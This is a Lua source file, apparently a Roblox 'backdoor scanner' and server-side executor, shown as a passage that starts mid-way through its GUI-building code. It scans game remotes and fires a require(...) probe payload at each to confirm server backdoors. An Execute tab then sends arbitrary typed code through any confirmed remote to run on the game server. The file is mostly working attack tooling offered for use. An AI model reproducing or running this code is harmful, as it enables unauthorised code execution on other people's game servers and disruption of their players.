	RemoteType.ZIndex = 3
	RemoteType.Parent = template

	local isBackdoor = Instance.new("TextLabel")
	isBackdoor.Name = "IsBackdoor"
	isBackdoor.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Bold,
		Enum.FontStyle.Normal
	)
	isBackdoor.Text = "Confirmed Backdoor:"
	isBackdoor.TextColor3 = Color3.fromRGB(242, 242, 242)
	isBackdoor.TextScaled = true
	isBackdoor.TextSize = 14
	isBackdoor.TextWrapped = true
	isBackdoor.TextXAlignment = Enum.TextXAlignment.Left
	isBackdoor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	isBackdoor.BackgroundTransparency = 1
	isBackdoor.BorderSizePixel = 0
	isBackdoor.Position = UDim2.fromScale(0.02, 0.325)
	isBackdoor.Size = UDim2.fromScale(0.4, 0.1)
	isBackdoor.ZIndex = 3

	local icon = Instance.new("ImageLabel")
	icon.Name = "Icon"
	icon.Image = "http://www.roblox.com/asset/?id=12555946557"
	icon.AnchorPoint = Vector2.new(0, 0.5)
	icon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	icon.BackgroundTransparency = 1
	icon.Position = UDim2.fromScale(1, 0.5)
	icon.Size = UDim2.fromScale(0.225, 2.25)
	icon.ZIndex = 3
	icon.Parent = isBackdoor

	isBackdoor.Parent = template

	local ignore = Instance.new("TextButton")
	ignore.Name = "Ignore"
	ignore.FontFace = Font.new(
		"rbxasset://fonts/families/Ubuntu.json",
		Enum.FontWeight.Medium,
		Enum.FontStyle.Normal
	)
	ignore.Text = "Ignore"
	ignore.TextColor3 = Color3.fromRGB(225, 14, 14)
	ignore.TextScaled = true
	ignore.TextSize = 24
	ignore.TextWrapped = true
	ignore.AutoButtonColor = false
	ignore.AnchorPoint = Vector2.new(0, 1)
	ignore.BackgroundColor3 = Color3.fromRGB(37, 99, 235)
	ignore.BackgroundTransparency = 1
	ignore.Position = UDim2.fromScale(0.02, 0.875)
	ignore.Size = UDim2.fromScale(0.4, 0.25)
	ignore.ZIndex = 3

	local uICorner1 = Instance.new("UICorner")
	uICorner1.Name = "UICorner"
	uICorner1.Parent = ignore

	local uIStroke1 = Instance.new("UIStroke")
	uIStroke1.Name = "UIStroke"
	uIStroke1.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	uIStroke1.Color = Color3.fromRGB(225, 14, 14)
	uIStroke1.Thickness = 2
	uIStroke1.Parent = ignore

	local uITextSizeConstraint1 = Instance.new("UITextSizeConstraint")
	uITextSizeConstraint1.Name = "UITextSizeConstraint"
	uITextSizeConstraint1.MaxTextSize = 32
	uITextSizeConstraint1.Parent = ignore

	ignore.Parent = template

	return ignore, test, icon, template
end


-- Remote Scanning Code
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ReplicatedFirst = game:GetService("ReplicatedFirst")
local Player = game:GetService("Players").LocalPlayer


local RemoteEvents = {}
local RemoteFunctions = {}
local ConfirmedRemoteEvents = {}
local ConfirmedRemoteFunctions = {}
local CommonRemotes = {
	"SetBlockedUserIdsRequest",
	"OnChannelJoined", 
	"OnNewMessage", 
	"OnChannelLeft", 
	"ChannelNameColorUpdated", 
	"OnMainChannelSet", 
	"SayMessageRequest", 
	"OnMuted", 
	"OnMessageDoneFiltering", 
	"OnUnmuted", 
	"OnNewSystemMessage",
	"MutePlayerRequest",
	"UnMutePlayerRequest",
	"GetInitDataRequest",
}


function generate_random_id()
	math.randomseed(os.time())
	local random_number = math.random(100000, 999999)
	local timestamp = os.time()
	local random_id = tostring(timestamp) .. tostring(random_number)
	return random_id
end


function CheckRemoteExists(valueName, timeout)
	local startTime = os.clock()
	while os.clock() - startTime < timeout do
		local playerScripts = game:GetService("Players").LocalPlayer.PlayerGui
		local value = playerScripts:FindFirstChild(valueName)
		if value then
			return true
		end
		wait(0.1)
	end
	return false
end

function DetectRemoteType(Item)
	if Item:IsA("RemoteEvent") then
		table.insert(RemoteEvents, Item)
	end

	if Item:IsA("RemoteFunction") then
		table.insert(RemoteFunctions, Item)
	end
	return
end

function fullScan(IncludeWorkspaceScan)
	if IncludeWorkspaceScan then
		for _, remote in ipairs(game:GetDescendants()) do
			DetectRemoteType(remote)
		end
		return
	end

	for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
		DetectRemoteType(remote)
	end
	for _, remote in ipairs(ReplicatedFirst:GetDescendants()) do
		DetectRemoteType(remote)
	end
	for _, remote in ipairs(Player:GetDescendants()) do
		DetectRemoteType(remote)
	end
	return
end

function TestRemoteEvent(remote)
	local ReturnAddress = math.random(0, 99999999)
	local payload = "require(" .. "12546477813" .. "):Ping(\"" .. Player.Name .. "\",\"" .. ReturnAddress .. "\")"
	remote:FireServer(payload)
	local Result = CheckRemoteExists(ReturnAddress, 5)
	if Result then
		table.insert(ConfirmedRemoteEvents, remote)
		return true
	end
	return false
end

function TestRemoteFunction(remote)
	local ReturnAddress = math.random(0, 99999999)
	local payload = "require(" .. "12546477813" .. "):Ping(\"" .. Player.Name .. "\",\"" .. ReturnAddress .. "\")"

	local co = coroutine.wrap(function()
		pcall(function()
			return remote:InvokeServer(payload)
		end)
	end)
	task.delay(3, co)

	if CheckRemoteExists(ReturnAddress, 5) then
		table.insert(ConfirmedRemoteFunctions, remote)
		return true
	end
	return false
end

function FilterRemotes()
	for i = #RemoteEvents, 1, -1 do
		local eventName = RemoteEvents[i].Name
		if table.find(CommonRemotes, eventName) then
			table.remove(RemoteEvents, i)
		end
	end

	for i = #RemoteFunctions, 1, -1 do
		local functionName = RemoteFunctions[i].Name
		if table.find(CommonRemotes, functionName) then
			table.remove(RemoteFunctions, i)
		end
	end
end

function ClearRemotes()
	RemoteEvents = {}
	RemoteFunctions = {}
	ConfirmedRemoteEvents = {}
	ConfirmedRemoteFunctions = {}
end


-- Gui Code
local CurrentPage = "Home"
local CurrentlyScanning = false
local IncludeWorkspaceInScan = false
local currentRemote = nil
local ScreenGui, mainContainer, PageContainer = GenerateGui()
local MinimizeButton, CloseButton, tabContainer, NavigationBar = GenerateNavbar(mainContainer)
local codePage, clearCodeButton, executeCodeButton, codeTextEditor = GenerateCodePage(PageContainer)
local homePage = GenerateHomePage(PageContainer)
local scanPage, promptRemoteContainer = GenerateScanPage(PageContainer)
GenerateDropShadow(mainContainer)
--ScreenGui.Parent = game.Players.LocalPlayer.PlayerGui


function FetchConfirmedRemotes()
	if #codePage.Remotes:GetChildren() > 2 then
		for _, item in pairs(codePage.Remotes:GetChildren()) do
			if item.Name == "UICorner" or item.Name == "UIListLayout" then
				return
			end
			item:Destroy()
		end
	end
	
	for _,remote in ipairs(ConfirmedRemoteEvents) do
		local remoteButton = GenerateRemoteSnippet(remote, codePage.Remotes)

		remoteButton.MouseButton1Click:Connect(function()
			currentRemote = remote
		end)
	end
	for _,remote in ipairs(ConfirmedRemoteFunctions) do
		local remoteButton = GenerateRemoteSnippet(remote, codePage.Remotes)

		remoteButton.MouseButton1Click:Connect(function()
			currentRemote = remote
		end)
	end
end

function UpdateToPage(NewPage)
	if NewPage == CurrentPage then
		return
	end
	if NewPage == "Execute" then
		FetchConfirmedRemotes()
	end

	tabContainer[CurrentPage].BackgroundTransparency = 1
	tabContainer[NewPage].BackgroundTransparency = 0
	tabContainer[NewPage].BackgroundColor3 = Color3.fromRGB(38, 38, 38)
	PageContainer[CurrentPage].Visible = false
	PageContainer[NewPage].Visible = true


	CurrentPage = NewPage
end

function DisplayPotentialRemotes()
	for index,remote in ipairs(RemoteEvents) do
		local ignoreButton, testButton, BackdoorIcon, Prompt = GeneratePromptItem(remote, promptRemoteContainer)
		ignoreButton.MouseButton1Click:Connect(function()
			table.remove(RemoteEvents, index)
			Prompt:Destroy()
		end)
		testButton.MouseButton1Click:Connect(function()
			local success = TestRemoteEvent(remote)
			if success then
				BackdoorIcon.Image = "http://www.roblox.com/asset/?id=12555965398"
			else
				BackdoorIcon.Image = "http://www.roblox.com/asset/?id=12555954054"
			end
			Prompt:Destroy()
		end)
	end
	for index,remote in ipairs(RemoteFunctions) do
		local ignoreButton, testButton, BackdoorIcon, Prompt = GeneratePromptItem(remote, promptRemoteContainer)
		ignoreButton.MouseButton1Click:Connect(function()
			table.remove(RemoteFunctions, index)
			Prompt:Destroy()
		end)
		testButton.MouseButton1Click:Connect(function()
			local success = TestRemoteFunction(remote)
			if success then
				BackdoorIcon.Image = "http://www.roblox.com/asset/?id=12555965398"
			else
				BackdoorIcon.Image = "http://www.roblox.com/asset/?id=12555954054"
			end
			Prompt:Destroy()
		end)
	end
end

function ScanButton(Button)
	if CurrentlyScanning then
		Button.Text = "Scan"
		Button.BackgroundColor3 = Color3.fromRGB(37, 99, 235)
		scanPage.Stage.Text = "Current Stage: Waiting For Scan"
		ClearRemotes()
		CurrentlyScanning = false
	end

	-- Reset Things
	ClearRemotes()
	scanPage.LoadingBar.Bar.Size = UDim2.new(0,0,1,0)
	scanPage.Stage.Text = "Current Stage: Waiting For Scan"

	-- Actual code
	CurrentlyScanning = true
	Button.Text = "Stop"
	Button.BackgroundColor3 = Color3.fromRGB(178,178,178)
	UpdateToPage("Scan")

	scanPage.Stage.Text = "Current Stage: Scanning For Remotes"
	fullScan(IncludeWorkspaceInScan)
	scanPage.LoadingBar.Bar.Size = UDim2.new(.5,0,1,0)
	scanPage.Stage.Text = "Current Stage: FilterRemotes"
	FilterRemotes()
	scanPage.LoadingBar.Bar.Size = UDim2.new(.8,0,1,0)
	scanPage.Stage.Text = "Current Stage: Showing Remotes"
	DisplayPotentialRemotes()

	promptRemoteContainer.ChildRemoved:Connect(function()
		if #promptRemoteContainer:GetChildren() <= 2 then
			Button.Text = "Scan"
			Button.BackgroundColor3 = Color3.fromRGB(37, 99, 235)
			scanPage.LoadingBar.Bar.Size = UDim2.new(1,0,1,0)
			scanPage.Stage.Text = "Current Stage: Done! Check Execute Tab"
			CurrentlyScanning = false
		end
	end)
end


-- Code page Buttons
executeCodeButton.MouseButton1Click:Connect(function()
	if currentRemote == nil then
		executeCodeButton.Text = "Please choose a remote!"
		task.wait(2)
		executeCodeButton.Text = "Execute"
	end

	if currentRemote:IsA("RemoteEvent") then
		currentRemote:FireServer(codeTextEditor.Text)
	end
	if currentRemote:IsA("RemoteEvent") then
		pcall(function()
			return currentRemote:InvokeServer(codeTextEditor.Text)
		end)
	end
end)

clearCodeButton.MouseButton1Click:Connect(function()
	codeTextEditor.Text = ""
end)

-- Scan page buttons
scanPage.IncludeWorkspace.MouseButton1Click:Connect(function()
	if IncludeWorkspaceInScan then
		IncludeWorkspaceInScan = false
		scanPage.IncludeWorkspace.CheckBox.Image = "http://www.roblox.com/asset/?id=12554669883"
	else
		IncludeWorkspaceInScan = true
		scanPage.IncludeWorkspace.CheckBox.Image = "http://www.roblox.com/asset/?id=12554668450"
	end
end)

scanPage.Scan.MouseButton1Click:Connect(function()
	ScanButton(scanPage.Scan)
end)

scanPage.Next.MouseButton1Click:Connect(function()
	promptRemoteContainer.UIPageLayout:Next()
end)

scanPage.Previous.MouseButton1Click:Connect(function()
	promptRemoteContainer.UIPageLayout:Previous()
end)


-- Home Page Buttons
homePage.Code.MouseButton1Click:Connect(function()
	UpdateToPage("Execute")
end)

homePage.Scan.MouseButton1Click:Connect(function(Button)
	UpdateToPage("Scan")
end)

-- Navigation Bar Buttons
for _, NavigationButton in pairs(tabContainer:GetChildren()) do
	NavigationButton.MouseButton1Click:Connect(function(Button)
		UpdateToPage(NavigationButton.Name)
	end)
end

CloseButton.MouseButton1Click:Connect(function()
	ScreenGui:Destroy()
end)

-- Smooth Drag
local Drag = mainContainer
gsCoreGui = game:GetService("CoreGui")
gsTween = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local dragging
local dragInput
local dragStart
local startPos
local function update(input)
	local delta = input.Position - dragStart
	local dragTime = 0.05
	local SmoothDrag = {}
	SmoothDrag.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	local dragSmoothFunction = gsTween:Create(Drag, TweenInfo.new(dragTime, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), SmoothDrag)
	dragSmoothFunction:Play()
end
Drag.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = Drag.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)
Drag.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)
UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging and Drag.Size then
		update(input)
	end
end)